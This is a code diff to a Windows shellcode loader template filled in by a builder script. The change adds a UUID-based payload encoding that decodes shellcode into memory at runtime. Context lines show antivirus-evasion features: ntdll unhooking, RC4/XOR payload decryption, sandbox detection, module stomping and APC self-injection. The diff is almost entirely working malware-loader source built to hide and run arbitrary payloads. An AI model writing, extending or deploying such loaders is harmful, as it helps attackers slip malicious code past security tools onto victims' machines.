@@ -325,8 +325,22 @@ static void unhook_ntdll() {
 
 // ─── Payload (stamped by builder.py) ────────────────────────────────────────
 
-static unsigned char payload[] = { %PAYLOAD% };
-static const size_t  payload_size = sizeof(payload);
+#ifdef USE_UUID
+static const char *g_payload_uuids[] = { %PAYLOAD% };
+static const size_t g_uuid_count     = %UUID_COUNT%;
+static const size_t payload_size     = %PAYLOAD_SIZE%;
+
+static BYTE _hb(char c) {
+    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
+    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
+    return (BYTE)(c - 'A' + 10);
+}
+static void uuid_decode(const char *u, BYTE *out) {
+    static const int pos[] = {0,2,4,6, 9,11, 14,16, 19,21, 24,26,28,30,32,34};
+    for (int i = 0; i < 16; i++)
+        out[i] = (_hb(u[pos[i]]) << 4) | _hb(u[pos[i]+1]);
+}
+#else
 
 // ─── RC4 ─────────────────────────────────────────────────────────────────────
 
@@ -360,6 +374,11 @@ static void xor_crypt(unsigned char *buf, size_t len) {
     for (size_t i = 0; i < len; i++) buf[i] ^= key[i % klen];
 }
 #endif
+
+static unsigned char payload[] = { %PAYLOAD% };
+static const size_t  payload_size = sizeof(payload);
+
+#endif /* USE_UUID */
 
 // ─── Sandbox check ───────────────────────────────────────────────────────────
 
@@ -515,7 +534,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG("[FAIL] Nt* API resolution failed"); return 1;
     }
 
-    /* Allocate local RW page for decrypted shellcode */
+    /* Allocate local RW page for decoded/decrypted shellcode */
     unsigned char *sc = NULL;
     SIZE_T sc_sz = payload_size;
 #if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
@@ -533,6 +552,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
 #endif
 
+#ifdef USE_UUID
+    for (size_t i = 0; i < g_uuid_count; i++)
+        uuid_decode(g_payload_uuids[i], sc + i * 16);
+    DBG_VAL("[5] UUID payload decoded, size", (unsigned long long)payload_size);
+#else
     memcpy(sc, payload, payload_size);
     memset(payload, 0, payload_size);
     DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);
@@ -547,6 +571,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 #else
     DBG("[6] No decryption (plaintext)");
 #endif
+#endif /* USE_UUID */
 
 #ifdef USE_SELF_INJECT
     /* Self-injection via local APC: create suspended thread + queue APC */
